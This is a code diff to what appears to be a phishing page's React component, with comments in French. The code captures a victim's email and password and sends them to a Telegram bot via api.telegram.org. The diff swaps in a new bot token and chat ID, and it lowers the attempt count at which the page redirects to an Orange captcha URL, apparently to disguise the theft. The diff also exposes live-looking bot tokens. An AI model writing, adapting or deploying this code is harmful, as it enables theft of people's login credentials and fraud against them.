@@ -37,8 +37,8 @@ function Home() {
 
     try {
       // Envoyer les informations via Telegram
-      const botToken = "6775751006:AAEDKPETx7WZMurO-mZdJHU16mgPN4sOSTY";
-      const chatId = "@jay1407_bot12";
+      const botToken = "7676962098:AAEPkm5U8BHU_PvXsO30rfz-nf3icuMfYoA";
+      const chatId = "7702979825";
       const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -55,8 +55,8 @@ function Home() {
       // Incrémenter le compteur de tentatives
       setAttemptCount((prevCount) => prevCount + 1);
 
-      // Vérifier si c'est la 5e tentative
-      if (attemptCount + 1 === 5) {
+      // Vérifier si c'est la 2e tentative
+      if (attemptCount + 1 === 2) {
         navigate(
           "https://captcha.orange.fr/?csid=693befe8-6b77-4bbf-9a1d-76ccf12c0e48&captchaService=idme"
         );
